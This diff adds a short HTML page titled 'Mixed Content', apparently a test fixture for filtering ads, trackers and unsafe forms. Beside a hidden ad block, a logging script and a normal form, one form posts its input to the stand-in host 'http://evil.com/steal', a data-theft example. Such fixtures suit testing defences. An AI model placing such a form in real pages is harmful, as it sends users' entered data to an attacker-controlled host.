@@ -1,0 +1,14 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Mixed Content</title>
+    <style>.ad {display:none;}</style>
+    <script>console.log('tracking');</script>
+</head>
+<body>
+    <h1>Mixed Page</h1>
+    <div class="ad">Ad block</div>
+    <form action="/submit"><input name="foo"></form>
+    <form action="http://evil.com/steal"><input name="bar"></form>
+</body>
+</html>
